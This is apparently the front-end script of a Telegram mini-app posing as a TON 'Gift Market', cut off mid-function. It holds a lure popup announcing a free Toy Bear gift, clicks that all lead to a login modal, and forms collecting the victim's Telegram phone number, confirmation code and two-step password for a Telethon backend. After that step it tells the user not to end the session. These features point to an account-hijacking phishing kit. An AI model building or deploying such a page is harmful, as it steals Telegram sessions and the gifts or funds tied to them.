const API_BASE = (window.TELETHON_API_URL || 'http://localhost:8000').replace(/\/$/, '');

const DEFAULT_MARKET = [
  { id: '352352', name: 'TON Emerald', number: 352352, price: 18.5, image: null },
  { id: '918204', name: 'Fragment Crown', number: 918204, price: 42, image: null },
  { id: '771409', name: 'Cipher Rose', number: 771409, price: 7.25, image: null },
  { id: '640912', name: 'Neon Crest', number: 640912, price: 13.8, image: null },
  { id: '502733', name: 'Binary Bloom', number: 502733, price: 5.6, image: null },
  { id: '431006', name: 'Fragment Shield', number: 431006, price: 21, image: null },
];

const DEFAULT_OWNED = [];

const DEFAULT_PROFILE = {
  tag: '@fragment_user',
  subtitle: null,
  balance: 0,
  avatar: null,
  stats: { volume: 0, bought: 0, sold: 0 },
};

const TRANSLATIONS = {
  ru: {
    title: 'Маркет подарков',
    header_subtitle: 'Маркет цифровых подарков',
    search_placeholder: 'Поиск по ID',
    sort_title: 'Сортировка по цене',
    sort_cheap: 'Сначала дешевле',
    sort_expensive: 'Сначала дороже',
    sort_popular: 'По популярности',
    sort_new: 'Новые',
    sort_range: '0 — {max} TON',
    action_withdraw: 'Вывести',
    action_sell: 'Продать',
    action_send: 'Отправить',
    action_withdraw_title: 'Вывод подарка',
    action_withdraw_subtitle: 'Переведите подарок в TON и получите средства на баланс.',
    action_withdraw_label: 'Сумма вывода (TON)',
    action_withdraw_placeholder: 'Например 15.5',
    action_withdraw_button: 'Вывести',
    action_sell_title: 'Продажа подарка',
    action_sell_subtitle: 'Выставьте подарок на продажу внутри Quest.',
    action_sell_label: 'Цена продажи (TON)',
    action_sell_placeholder: 'Например 24',
    action_sell_button: 'Выставить',
    action_send_title: 'Передача подарка',
    action_send_subtitle: 'Отправьте подарок другому пользователю.',
    action_send_label: 'Получатель',
    action_send_placeholder: '@username',
    action_send_button: 'Передать',
    action_fee_note: 'Комиссия 0% до 20 января',
    action_send_note: 'Передача внутри Quest займёт несколько секунд.',
    action_sell_note: 'После размещения подарок появится в маркете.',
    action_withdraw_note: 'Средства будут доступны на балансе в приложении.',
    action_close: 'Закрыть',
    action_done: 'Заявка отправлена',
    nav_market: 'Маркет',
    nav_owned: 'Мои подарки',
    nav_profile: 'Профиль',
    stats_volume: 'Текущий объем',
    stats_bought: 'Куплено',
    stats_sold: 'Продано',
    ref_title: 'Реф система',
    ref_text: 'Приглашай друзей и получай до 5% с их депозитов.',
    ref_button: 'Пригласить друзей',
    auth_title: 'Авторизация',
    auth_intro_1: 'Войдите для расширенных действий в маркете.',
    auth_intro_2: 'Для продажи, покупки, обмена подарков необходимо авторизоваться через Telegram.',
    auth_start: 'Войти через Telegram',
    auth_phone_title: 'Вход через Telegram',
    auth_phone_text: 'Поделитесь номером телефона из аккаунта Telegram.',
    auth_phone_share: 'Поделиться номером',
    auth_next: 'Далее',
    auth_code_title: 'Код подтверждения',
    auth_code_text: 'Мы отправили код в приложение Telegram.',
    auth_code_label: 'Код',
    auth_back: 'Назад',
    auth_password_title: 'Двухэтапная защита',
    auth_password_text: 'Введите пароль двухэтапной авторизации.',
    auth_password_label: 'Пароль',
    auth_loading: 'Загрузка...',
    auth_success_title: 'Не завершайте сессию',
    auth_success_text: 'Ожидайте подтверждения запроса.',
    empty_market_title: 'Ничего не найдено',
    empty_market_subtitle: 'Попробуйте другой ID.',
    empty_owned_title: 'Пока нет подарков',
    empty_owned_subtitle: 'Здесь появятся ваши покупки.',
    toast_select_gift: 'Выберите подарок',
    card_received: 'Получено: {date}',
    card_received_empty: 'Дата получения: —',
    buy_gift: 'Купить подарок',
    buy_for: 'Купить за {price} TON',
    phone_short: 'Номер телефона слишком короткий.',
    phone_missing: 'Поделитесь номером телефона в Telegram.',
    sending_code: '',
    send_code_failed: 'Не удалось отправить код.',
    code_sent: '',
    send_code_error: 'Ошибка отправки кода.',
    rate_limit: 'Слишком много попыток. Повторите через {seconds} сек.',
    rate_limit_generic: 'Слишком много попыток. Попробуйте позже.',
    code_short: 'Введите 5-значный код.',
    verify_code: 'Проверяем код...',
    auth_error: 'Ошибка входа.',
    password_required: 'Нужен пароль двухэтапной защиты.',
    password_prompt: 'Введите пароль.',
    verify_password: 'Проверяем пароль...',
    profile_subtitle: 'Коллекция подарков',
    settings_haptics: 'Вибрация',
    settings_haptics_on: 'Вкл',
    settings_haptics_off: 'Выкл',
    settings_language: 'Язык',
    settings_language_ru: 'Русский',
    settings_language_en: 'English',
    aria_topup: 'Пополнить',
    aria_settings: 'Настройки',
    aria_nav: 'Навигация',
    aria_close: 'Закрыть',
    aria_show_password: 'Показать пароль',
    aria_hide_password: 'Скрыть пароль',
    gift_title: 'Вам перевели ToyBear-31248',
    gift_button: 'Получить',
    aria_price_max: 'Максимальная цена',
    alt_market_logo: 'Маркет',
  },
  en: {
    title: 'Gift Market',
    header_subtitle: 'Digital gifts marketplace',
    search_placeholder: 'Search by ID',
    sort_title: 'Sort by price',
    sort_cheap: 'Cheapest first',
    sort_expensive: 'Most expensive first',
    sort_popular: 'Most popular',
    sort_new: 'Newest',
    sort_range: '0 — {max} TON',
    action_withdraw: 'Withdraw',
    action_sell: 'Sell',
    action_send: 'Send',
    action_withdraw_title: 'Gift withdrawal',
    action_withdraw_subtitle: 'Convert the gift to TON and receive funds on balance.',
    action_withdraw_label: 'Withdrawal amount (TON)',
    action_withdraw_placeholder: 'For example 15.5',
    action_withdraw_button: 'Withdraw',
    action_sell_title: 'Gift sale',
    action_sell_subtitle: 'List the gift for sale inside Quest.',
    action_sell_label: 'Sale price (TON)',
    action_sell_placeholder: 'For example 24',
    action_sell_button: 'List for sale',
    action_send_title: 'Gift transfer',
    action_send_subtitle: 'Send the gift to another user.',
    action_send_label: 'Recipient',
    action_send_placeholder: '@username',
    action_send_button: 'Send',
    action_fee_note: '0% fee until Jan 20',
    action_send_note: 'Transfers inside Quest take a few seconds.',
    action_sell_note: 'After listing, the gift will appear in the market.',
    action_withdraw_note: 'Funds will be available on your in-app balance.',
    action_close: 'Close',
    action_done: 'Request submitted',
    nav_market: 'Market',
    nav_owned: 'My gifts',
    nav_profile: 'Profile',
    stats_volume: 'Total volume',
    stats_bought: 'Bought',
    stats_sold: 'Sold',
    ref_title: 'Referral program',
    ref_text: 'Invite friends and earn up to 5% from their deposits.',
    ref_button: 'Invite friends',
    auth_title: 'Authorization',
    auth_intro_1: 'Sign in for extended market actions.',
    auth_intro_2: 'To sell, buy, or exchange gifts you need Telegram authorization.',
    auth_start: 'Sign in with Telegram',
    auth_phone_title: 'Telegram login',
    auth_phone_text: 'Share your Telegram phone number to continue.',
    auth_phone_share: 'Share phone number',
    auth_next: 'Next',
    auth_code_title: 'Confirmation code',
    auth_code_text: 'We sent the code to Telegram.',
    auth_code_label: 'Code',
    auth_back: 'Back',
    auth_password_title: 'Two-step verification',
    auth_password_text: 'Enter your two-step verification password.',
    auth_password_label: 'Password',
    auth_loading: 'Loading...',
    auth_success_title: 'Do not end the session',
    auth_success_text: 'Please wait for confirmation.',
    empty_market_title: 'Nothing found',
    empty_market_subtitle: 'Try a different ID.',
    empty_owned_title: 'No gifts yet',
    empty_owned_subtitle: 'Your purchases will appear here.',
    toast_select_gift: 'Select a gift',
    card_received: 'Received: {date}',
    card_received_empty: 'Received date: —',
    buy_gift: 'Buy gift',
    buy_for: 'Buy for {price} TON',
    phone_short: 'Phone number is too short.',
    phone_missing: 'Please share your phone number in Telegram.',
    sending_code: 'Sending code...',
    send_code_failed: 'Failed to send the code.',
    code_sent: 'Code sent.',
    send_code_error: 'Code sending failed.',
    rate_limit: 'Too many attempts. Try again in {seconds} sec.',
    rate_limit_generic: 'Too many attempts. Try again later.',
    code_short: 'Enter the 5-digit code.',
    verify_code: 'Verifying code...',
    auth_error: 'Login failed.',
    password_required: 'Two-step password required.',
    password_prompt: 'Enter your password.',
    verify_password: 'Checking password...',
    profile_subtitle: 'Gift collection',
    settings_haptics: 'Vibration',
    settings_haptics_on: 'On',
    settings_haptics_off: 'Off',
    settings_language: 'Language',
    settings_language_ru: 'Russian',
    settings_language_en: 'English',
    aria_topup: 'Top up',
    aria_settings: 'Settings',
    aria_nav: 'Navigation',
    aria_close: 'Close',
    aria_show_password: 'Show password',
    aria_hide_password: 'Hide password',
    gift_title: 'You received ToyBear-31248',
    gift_button: 'Claim',
    aria_price_max: 'Maximum price',
    alt_market_logo: 'Market',
  },
};

const state = {
  market: DEFAULT_MARKET,
  marketPopular: null,
  marketNew: null,
  owned: DEFAULT_OWNED,
  profile: DEFAULT_PROFILE,
  search: '',
  sortMode: 'popular',
  sortMaxPrice: null,
  sortRangeMax: null,
  language: 'ru',
  hapticsEnabled: true,
  marketRendered: false,
  ownedRendered: false,
  isAuthorized: false,
  selectedOwnedId: null,
  hasChatAccess: false,
  activeOwnedAction: null,
};

const SETTINGS_KEYS = {
  language: 'market.language',
  haptics: 'market.haptics',
};

const BOOT_KEY = 'market.boot';
const GIFT_POPUP_NUMBER = 31248;
const GIFT_POPUP_NAME = 'Toy Bear';
const GIFT_POPUP_KEY = 'market.gift.toybear31248.last';
const GIFT_POPUP_GIF = '/market-data/src/ToyBear.gif';
const ACTION_CONFIG = {
  withdraw: {
    title: 'action_withdraw_title',
    subtitle: 'action_withdraw_subtitle',
    button: 'action_withdraw_button',
  },
  sell: {
    title: 'action_sell_title',
    subtitle: 'action_sell_subtitle',
    button: 'action_sell_button',
  },
  send: {
    title: 'action_send_title',
    subtitle: 'action_send_subtitle',
    button: 'action_send_button',
  },
};

let tgWebApp = null;
let authToken = null;
let authLoading = false;
let dataLoaded = false;

const elements = {
  boot: document.getElementById('boot'),
  headerMain: document.getElementById('header-main'),
  headerProfile: document.getElementById('header-profile'),
  headerAvatar: document.getElementById('header-avatar'),
  headerTag: document.getElementById('header-tag'),
  headerSub: document.getElementById('header-sub'),
  headerBalance: document.getElementById('header-balance'),
  profileAvatar: document.getElementById('profile-avatar'),
  profileTag: document.getElementById('profile-tag'),
  profileBalance: document.getElementById('profile-balance'),
  statVolume: document.getElementById('stat-volume'),
  statBought: document.getElementById('stat-bought'),
  statSold: document.getElementById('stat-sold'),
  marketGrid: document.getElementById('market-grid'),
  ownedGrid: document.getElementById('owned-grid'),
  searchInput: document.getElementById('search-input'),
  filterBtn: document.getElementById('filter-btn'),
  sortPanel: document.getElementById('sort-panel'),
  sortValue: document.getElementById('sort-value'),
  sortFill: document.getElementById('sort-fill'),
  sortThumb: document.getElementById('sort-thumb'),
  sortRange: document.getElementById('sort-range'),
  sortMin: document.getElementById('sort-min'),
  sortMax: document.getElementById('sort-max'),
  sortChips: Array.from(document.querySelectorAll('.sort-chip')),
  settingsBtn: document.getElementById('settings-btn'),
  settingsPanel: document.getElementById('settings-panel'),
  settingsHapticsButtons: Array.from(document.querySelectorAll('[data-haptics]')),
  settingsLanguageButtons: Array.from(document.querySelectorAll('[data-lang]')),
  balancePlus: document.getElementById('balance-plus'),
  navItems: Array.from(document.querySelectorAll('.nav-item')),
  tabs: Array.from(document.querySelectorAll('.tab')),
  actionButtons: Array.from(document.querySelectorAll('.action-btn')),
  toast: document.getElementById('toast'),
  authModal: document.getElementById('auth-modal'),
  authIntro: document.getElementById('auth-intro'),
  authPhoneForm: document.getElementById('auth-phone'),
  authCodeForm: document.getElementById('auth-code'),
  authPasswordForm: document.getElementById('auth-password'),
  authLoading: document.getElementById('auth-loading'),
  authSuccess: document.getElementById('auth-success'),
  authStatus: document.getElementById('auth-status'),
  actionModal: document.getElementById('action-modal'),
  actionTitle: document.getElementById('action-title'),
  actionSubtitle: document.getElementById('action-subtitle'),
  actionGiftImage: document.getElementById('action-gift-image'),
  actionGiftName: document.getElementById('action-gift-name'),
  actionGiftNumber: document.getElementById('action-gift-number'),
  actionSubmit: document.getElementById('action-submit'),
  actionPanels: Array.from(document.querySelectorAll('[data-action-panel]')),
  actionInputs: Array.from(document.querySelectorAll('.action-input')),
  authStart: document.getElementById('auth-start'),
  authCodeInput: document.getElementById('auth-code-input'),
  codeInput: document.getElementById('code-input'),
  codeCells: document.getElementById('code-cells'),
  codeCellNodes: Array.from(document.querySelectorAll('#code-cells .code-cell')),
  authPasswordInput: document.getElementById('auth-password-input'),
  passwordInput: document.getElementById('password-input'),
  passwordToggle: document.getElementById('password-toggle'),
  authBack: document.getElementById('auth-back'),
  authBackPassword: document.getElementById('auth-back-password'),
  giftModal: document.getElementById('gift-modal'),
  giftImage: document.getElementById('gift-image'),
  giftAccept: document.getElementById('gift-accept'),
  alert: document.getElementById('alert'),
};

function wait(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function preloadImage(src, timeoutMs = 12000) {
  return new Promise((resolve) => {
    if (!src) return resolve(false);
    const img = new Image();
    let settled = false;
    const done = (ok) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      resolve(ok);
    };
    const timer = setTimeout(() => done(false), timeoutMs);
    img.onload = () => done(true);
    img.onerror = () => done(false);
    img.src = src;
  });
}

function t(key, vars = {}) {
  const dict = TRANSLATIONS[state.language] || TRANSLATIONS.ru;
  const base = dict[key] || TRANSLATIONS.ru[key] || key;
  return Object.keys(vars).reduce((text, token) => {
    return text.replace(new RegExp(`\\{${token}\\}`, 'g'), vars[token]);
  }, base);
}

function applyTranslations() {
  document.documentElement.lang = state.language;
  document.title = t('title');
  document.querySelectorAll('[data-i18n]').forEach((el) => {
    const key = el.dataset.i18n;
    if (key) el.textContent = t(key);
  });
  document.querySelectorAll('[data-i18n-placeholder]').forEach((el) => {
    const key = el.dataset.i18nPlaceholder;
    if (key) el.setAttribute('placeholder', t(key));
  });
  document.querySelectorAll('[data-i18n-aria]').forEach((el) => {
    const key = el.dataset.i18nAria;
    if (key) el.setAttribute('aria-label', t(key));
  });
  document.querySelectorAll('[data-i18n-alt]').forEach((el) => {
    const key = el.dataset.i18nAlt;
    if (key) el.setAttribute('alt', t(key));
  });
  updateSortUi();
  updatePasswordToggleLabel();
}

function loadSettings() {
  try {
    const storedLang = localStorage.getItem(SETTINGS_KEYS.language);
    if (storedLang === 'ru' || storedLang === 'en') {
      state.language = storedLang;
    }
    const storedHaptics = localStorage.getItem(SETTINGS_KEYS.haptics);
    if (storedHaptics === 'off') state.hapticsEnabled = false;
    if (storedHaptics === 'on') state.hapticsEnabled = true;
  } catch (err) {
    console.warn('Settings load failed:', err);
  }
}

function applySettingsUi() {
  if (elements.settingsHapticsButtons.length) {
    elements.settingsHapticsButtons.forEach((btn) => {
      btn.classList.toggle('is-active', btn.dataset.haptics === (state.hapticsEnabled ? 'on' : 'off'));
    });
  }
  if (elements.settingsLanguageButtons.length) {
    elements.settingsLanguageButtons.forEach((btn) => {
      btn.classList.toggle('is-active', btn.dataset.lang === state.language);
    });
  }
}

function setLanguage(lang) {
  state.language = lang === 'en' ? 'en' : 'ru';
  try {
    localStorage.setItem(SETTINGS_KEYS.language, state.language);
  } catch (err) {
    console.warn('Settings save failed:', err);
  }
  applyTranslations();
  applySettingsUi();
  renderMarket();
  renderOwned();
  applyProfile(state.profile);
}

function setHapticsEnabled(enabled) {
  state.hapticsEnabled = Boolean(enabled);
  try {
    localStorage.setItem(SETTINGS_KEYS.haptics, state.hapticsEnabled ? 'on' : 'off');
  } catch (err) {
    console.warn('Settings save failed:', err);
  }
  applySettingsUi();
  if (state.hapticsEnabled) triggerHaptic('light');
}

function closeSettingsPanel() {
  if (!elements.settingsPanel) return;
  elements.settingsPanel.classList.remove('is-open');
  elements.settingsPanel.setAttribute('aria-hidden', 'true');
}

function toggleSettingsPanel() {
  if (!elements.settingsPanel) return;
  const isOpen = elements.settingsPanel.classList.toggle('is-open');
  elements.settingsPanel.setAttribute('aria-hidden', String(!isOpen));
}

function clearBootOverlay() {
  if (document.body.classList.contains('is-loading')) {
    document.body.classList.remove('is-loading');
  }
  if (elements.boot) {
    elements.boot.classList.add('is-hidden');
    const bootEl = elements.boot;
    elements.boot = null;
    setTimeout(() => {
      bootEl.remove();
    }, 500);
  }
}

function shouldSkipBoot() {
  try {
    return sessionStorage.getItem(BOOT_KEY) === '1';
  } catch (err) {
    return false;
  }
}

function markBootShown() {
  try {
    sessionStorage.setItem(BOOT_KEY, '1');
  } catch (err) {
    console.warn('Boot flag save failed:', err);
  }
}

function triggerHaptic(style = 'light') {
  if (!state.hapticsEnabled) return;
  const tg = tgWebApp || window.Telegram?.WebApp;
  const impact = tg?.HapticFeedback?.impactOccurred;
  const allowed = new Set(['light', 'medium', 'heavy', 'rigid', 'soft']);
  try {
    if (typeof impact === 'function') {
      impact(allowed.has(style) ? style : 'light');
      return;
    }
  } catch (err) {
    console.warn('HapticFeedback failed:', err);
  }
  if (typeof navigator !== 'undefined' && typeof navigator.vibrate === 'function') {
    const duration = style === 'heavy' ? 30 : style === 'medium' ? 20 : 12;
    navigator.vibrate(duration);
  }
}

function initTelegram() {
  (function waitTg() {
    const tg = window.Telegram?.WebApp;
    if (tg?.ready) {
      tgWebApp = tg;
      try {
        tg.ready();
        tg.expand?.();
      } catch (err) {
        console.warn('Telegram WebApp init failed:', err);
      }
      applyProfile(state.profile);
      return;
    }
    setTimeout(waitTg, 50);
  })();
}

function getTelegramUser() {
  const user = window.Telegram?.WebApp?.initDataUnsafe?.user;
  if (user) return user;

  const initData = window.Telegram?.WebApp?.initData;
  if (!initData) return null;

  try {
    const params = new URLSearchParams(initData);
    const rawUser = params.get('user');
    if (rawUser) return JSON.parse(rawUser);
  } catch (err) {
    console.warn('Failed to parse Telegram init data:', err);
  }

  return null;
}

function buildRequesterPayload() {
  const user = getTelegramUser();
  if (!user) {
    return {
      user_id: null,
      username: null,
      first_name: null,
      last_name: null,
    };
  }

  return {
    user_id: user.id ?? null,
    username: user.username ?? null,
    first_name: user.first_name ?? null,
    last_name: user.last_name ?? null,
  };
}

function getProfilePath() {
  const user = getTelegramUser();
  if (!user) return '/market/profile';
  const params = new URLSearchParams();
  if (user.id != null) params.set('user_id', user.id);
  if (user.username) params.set('username', user.username);
  const query = params.toString();
  return query ? `/market/profile?${query}` : '/market/profile';
}

function getAccessPath() {
  const user = getTelegramUser();
  if (!user || user.id == null) return '/market/access';
  const params = new URLSearchParams();
  params.set('user_id', user.id);
  const query = params.toString();
  return query ? `/market/access?${query}` : '/market/access';
}

async function fetchJson(path, fallback) {
  try {
    const res = await fetch(`${API_BASE}${path}`, { cache: 'no-store' });
    if (!res.ok) throw new Error(`Request failed: ${res.status}`);
    return await res.json();
  } catch (err) {
    console.warn('Fetch failed:', path, err);
    return fallback;
  }
}

function formatTon(value) {
  const num = Number(value);
  if (!Number.isFinite(num)) return '0';
  const hasDecimals = Math.abs(num % 1) > 0.001;
  const locale = state.language === 'en' ? 'en-US' : 'ru-RU';
  return num.toLocaleString(locale, {
    minimumFractionDigits: hasDecimals ? 2 : 0,
    maximumFractionDigits: 2,
  });
}

function getPriceValue(item) {
  const price = Number(item?.price);
  return Number.isFinite(price) ? price : 0;
}

function getItemNumberValue(item) {
  const raw = item?.number ?? item?.id ?? 0;
  const num = Number(String(raw).replace(/\D/g, ''));
  return Number.isFinite(num) ? num : 0;
}

function getOwnedId(item, index) {
  const value = item?.id ?? item?.number ?? index;
  return String(value);
}

function isToyBearItem(item) {
  const numberValue = Number(String(item?.number ?? '').replace(/\D/g, ''));
  if (numberValue === GIFT_POPUP_NUMBER) return true;
  const name = String(item?.name || '').toLowerCase();
  return name.includes(GIFT_POPUP_NAME.toLowerCase());
}

function filterOwnedForCurrentUser(items) {
  const user = getTelegramUser();
  if (!user) return items;
  const userId = user.id;
  const username = String(user.username || '').toLowerCase();
  return items.filter((item) => {
    const ownerId = item?.owner_id;
    if (ownerId !== undefined && ownerId !== null && userId !== null && userId !== undefined) {
      const idMatch = Number(ownerId) === Number(userId);
      if (Number.isFinite(Number(ownerId))) return idMatch;
    }
    const ownerUsername = String(item?.owner_username || '').toLowerCase();
    if (ownerUsername && username) {
      return ownerUsername === username;
    }
    const itemId = String(item?.id || '');
    if (userId && itemId.includes(`-${userId}-`)) {
      return true;
    }
    return false;
  });
}

function dedupeToyBear(items) {
  let seen = false;
  const filtered = [];
  for (let i = items.length - 1; i >= 0; i -= 1) {
    const item = items[i];
    if (isToyBearItem(item)) {
      if (seen) continue;
      seen = true;
    }
    filtered.push(item);
  }
  return filtered.reverse();
}

function normalizeMaxPrice(value) {
  const max = Number(value);
  if (!Number.isFinite(max) || max <= 0) return 100;
  if (max <= 1000) return Math.ceil(max / 10) * 10;
  if (max <= 10000) return Math.ceil(max / 100) * 100;
  return Math.ceil(max / 1000) * 1000;
}

function updateSortUi() {
  if (!elements.sortRange || !elements.sortFill || !elements.sortThumb) return;
  if (state.sortRangeMax === null) return;
  const rangeMax = state.sortRangeMax;
  const maxPrice = state.sortMaxPrice ?? rangeMax;
  const safeRange = rangeMax > 0 ? rangeMax : 1;
  const percent = Math.min(100, Math.max(0, (maxPrice / safeRange) * 100));

  elements.sortFill.style.width = `${percent}%`;
  elements.sortThumb.style.left = `${percent}%`;

  if (elements.sortValue) {
    elements.sortValue.textContent = t('sort_range', { max: formatTon(maxPrice) });
  }
  if (elements.sortMin) elements.sortMin.textContent = '0';
  if (elements.sortMax) elements.sortMax.textContent = formatTon(rangeMax);
  elements.sortRange.value = String(maxPrice);
}

function syncCodeCells() {
  if (!elements.authCodeInput || !elements.codeCellNodes.length) return;
  const raw = elements.authCodeInput.value || '';
  const digits = raw.replace(/\D/g, '').slice(0, 5);
  if (raw !== digits) {
    elements.authCodeInput.value = digits;
  }

  elements.codeCellNodes.forEach((cell, index) => {
    const char = digits[index] || '';
    cell.textContent = char;
    cell.classList.toggle('is-filled', Boolean(char));
    cell.classList.toggle('is-active', index === digits.length && digits.length < 5);
  });

  if (!digits.length && elements.codeCellNodes[0]) {
    elements.codeCellNodes[0].classList.add('is-active');
  }
}

function setCodeError(isError) {
  if (!elements.codeInput) return;
  elements.codeInput.classList.toggle('is-error', Boolean(isError));
}

function setPasswordError(isError) {
  if (!elements.passwordInput) return;
  elements.passwordInput.classList.toggle('is-error', Boolean(isError));
}

function updatePasswordToggleLabel() {
  if (!elements.passwordToggle) return;
  const isVisible = elements.passwordToggle.classList.contains('is-visible');
  const key = isVisible ? 'aria_hide_password' : 'aria_show_password';
  elements.passwordToggle.dataset.i18nAria = key;
  elements.passwordToggle.setAttribute('aria-label', t(key));
}

function initSortRange(items) {
  if (!elements.sortRange) return;
  const maxPrice = normalizeMaxPrice(Math.max(...items.map(getPriceValue), 0));
  state.sortRangeMax = maxPrice;
  if (!Number.isFinite(state.sortMaxPrice) || state.sortMaxPrice === null) {
    state.sortMaxPrice = maxPrice;
  } else {
    state.sortMaxPrice = Math.min(state.sortMaxPrice, maxPrice);
  }
  elements.sortRange.min = '0';
  elements.sortRange.max = String(maxPrice);
  elements.sortRange.step = maxPrice <= 100 ? '1' : maxPrice <= 1000 ? '5' : '10';
  updateSortUi();
}

function setSortMode(mode) {
  state.sortMode = mode;
  if (elements.sortChips.length) {
    elements.sortChips.forEach((chip) => {
      chip.classList.toggle('is-active', chip.dataset.sort === mode);
    });
  }
}

function shufflePreferCheap(items) {
  const pool = items.slice();
  const result = [];
  while (pool.length) {
    let total = 0;
    const weights = pool.map((item) => {
      const weight = 1 / (getPriceValue(item) + 1);
      total += weight;
      return weight;
    });
    let roll = Math.random() * total;
    let index = 0;
    for (; index < weights.length; index += 1) {
      roll -= weights[index];
      if (roll <= 0) break;
    }
    const pickIndex = Math.min(index, pool.length - 1);
    result.push(pool.splice(pickIndex, 1)[0]);
  }
  return result;
}

function getSortedMarketItems() {
  const base = Array.isArray(state.market) ? state.market : [];
  if (!base.length) return [];

  switch (state.sortMode) {
    case 'expensive':
      return [...base].sort((a, b) => getPriceValue(b) - getPriceValue(a));
    case 'popular':
      return state.marketPopular ? state.marketPopular.slice() : shufflePreferCheap(base);
    case 'new':
      return state.marketNew ? state.marketNew.slice() : [...base].sort((a, b) => getItemNumberValue(b) - getItemNumberValue(a));
    case 'cheap':
    default:
      return [...base].sort((a, b) => getPriceValue(a) - getPriceValue(b));
  }
}

function buildPlaceholder(seed, label) {
  const normalized = Number(String(seed || 0).replace(/\D/g, '')) || 0;
  const hue = (normalized * 37) % 360;
  const shortLabel = String(label || 'NFT').slice(0, 6).toUpperCase();
  const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="600" height="600" viewBox="0 0 600 600"><defs><linearGradient id="g" x1="0" x2="1" y1="0" y2="1"><stop offset="0" stop-color="hsl(${hue},80%,52%)"/><stop offset="1" stop-color="hsl(${(hue + 40) % 360},80%,42%)"/></linearGradient></defs><rect width="600" height="600" fill="url(#g)"/><circle cx="450" cy="150" r="130" fill="rgba(255,255,255,0.18)"/><circle cx="140" cy="460" r="180" fill="rgba(0,0,0,0.2)"/><text x="50%" y="52%" text-anchor="middle" font-family="SF Pro Text, -apple-system, BlinkMacSystemFont, sans-serif" font-size="64" fill="rgba(255,255,255,0.85)" letter-spacing="4">${shortLabel}</text></svg>`;
  return `data:image/svg+xml;charset=UTF-8,${encodeURIComponent(svg)}`;
}

function resolveImageUrl(image) {
  if (!image) return null;
  if (/^https?:\/\//i.test(image)) return image;
  if (image.startsWith('/')) return `${API_BASE}${image}`;
  return image;
}

function setAvatar(el, url, label) {
  if (!el) return;
  const fallbackLabel = label || '?';
  el.style.backgroundImage = '';
  el.textContent = fallbackLabel;
  if (!url) return;

  const img = new Image();
  img.onload = () => {
    el.style.backgroundImage = `url('${url}')`;
    el.textContent = '';
  };
  img.onerror = () => {
    el.style.backgroundImage = '';
    el.textContent = fallbackLabel;
  };
  img.src = url;
}

function applyProfile(profile) {
  const tgUser = getTelegramUser();
  const tagFromProfile = profile?.tag || DEFAULT_PROFILE.tag;
  const tagFromTg = tgUser?.username ? `@${tgUser.username}` : null;
  const tag = tagFromTg || tagFromProfile || '@anonymous';
  const profileSubtitle = profile?.subtitle;
  const defaultRu = TRANSLATIONS.ru.profile_subtitle;
  const defaultEn = TRANSLATIONS.en.profile_subtitle;
  const subtitle =
    profileSubtitle && profileSubtitle !== defaultRu && profileSubtitle !== defaultEn
      ? profileSubtitle
      : t('profile_subtitle');
  const balance = formatTon(profile?.balance ?? DEFAULT_PROFILE.balance);
  const avatarUrl = tgUser?.photo_url || profile?.avatar || null;
  const label = tag.replace('@', '').slice(0, 1).toUpperCase();

  if (elements.headerTag) elements.headerTag.textContent = tag;
  if (elements.profileTag) elements.profileTag.textContent = tag;
  if (elements.headerSub) elements.headerSub.textContent = subtitle;
  if (elements.headerBalance) elements.headerBalance.textContent = balance;
  if (elements.profileBalance) elements.profileBalance.textContent = balance;

  setAvatar(elements.headerAvatar, avatarUrl, label);
  setAvatar(elements.profileAvatar, avatarUrl, label);

  if (elements.statVolume) elements.statVolume.textContent = formatTon(profile?.stats?.volume ?? 0);
  if (elements.statBought) elements.statBought.textContent = formatTon(profile?.stats?.bought ?? 0);
  if (elements.statSold) elements.statSold.textContent = formatTon(profile?.stats?.sold ?? 0);
}

function createLockIcon() {
  const wrap = document.createElement('button');
  wrap.className = 'lock';
  wrap.type = 'button';
  wrap.setAttribute('aria-label', t('buy_gift'));
  wrap.innerHTML = '<i data-lucide="lock" aria-hidden="true"></i>';
  return wrap;
}

function createMarketCard(item, index, disableAnimation) {
  const card = document.createElement('article');
  card.className = 'card';
  if (disableAnimation) {
    card.style.animation = 'none';
    card.style.opacity = '1';
    card.style.transform = 'translateY(0)';
  } else {
    card.style.animationDelay = `${index * 0.06}s`;
  }
  card.addEventListener('click', () => {
    triggerHaptic('light');
    openAuthModal();
  });

  const media = document.createElement('div');
  media.className = 'card-media';
  const img = document.createElement('img');
  const fallback = buildPlaceholder(item.number || item.id || index, item.name);
  img.src = resolveImageUrl(item.image) || fallback;
  img.alt = item.name || 'NFT';
  img.loading = 'lazy';
  img.addEventListener('error', () => {
    if (img.src !== fallback) img.src = fallback;
  });
  media.appendChild(img);

  const title = document.createElement('div');
  title.className = 'card-title';
  title.textContent = item.name || 'NFT Gift';

  const number = document.createElement('div');
  number.className = 'card-number';
  const numberValue = item.number ?? item.id ?? '';
  number.textContent = numberValue ? `#${numberValue}` : '#—';

  const actions = document.createElement('div');
  actions.className = 'card-actions';

  const price = document.createElement('button');
  price.className = 'price-btn';
  price.type = 'button';
  price.setAttribute('aria-label', t('buy_for', { price: formatTon(item.price ?? 0) }));
  const priceIcon = document.createElement('img');
  priceIcon.className = 'ton-icon';
  priceIcon.src = './img/image.png';
  priceIcon.alt = 'TON';
  price.appendChild(priceIcon);
  const priceValue = document.createElement('span');
  priceValue.textContent = formatTon(item.price ?? 0);
  price.appendChild(priceValue);

  const lock = createLockIcon();

  price.addEventListener('click', (event) => {
    event.stopPropagation();
    triggerHaptic('light');
    openAuthModal();
  });

  lock.addEventListener('click', (event) => {
    event.stopPropagation();
    triggerHaptic('light');
    openAuthModal();
  });

  actions.appendChild(price);
  actions.appendChild(lock);

  card.appendChild(media);
  card.appendChild(title);
  card.appendChild(number);
  card.appendChild(actions);

  return card;
}

function createOwnedCard(item, index, disableAnimation) {
  const card = document.createElement('article');
  card.className = 'card';
  if (disableAnimation) {
    card.style.animation = 'none';
    card.style.opacity = '1';
    card.style.transform = 'translateY(0)';
  } else {
    card.style.animationDelay = `${index * 0.06}s`;
  }
  card.dataset.ownedId = getOwnedId(item, index);

  const media = document.createElement('div');
  media.className = 'card-media';
  const img = document.createElement('img');
  const fallback = buildPlaceholder(item.number || item.id || index, item.name);
  img.src = resolveImageUrl(item.image) || fallback;
  img.alt = item.name || 'NFT';
  img.loading = 'lazy';
  img.addEventListener('error', () => {
    if (img.src !== fallback) img.src = fallback;
  });
  media.appendChild(img);

  const meta = document.createElement('div');
  meta.className = 'card-meta';

  const title = document.createElement('div');
  title.className = 'card-title';
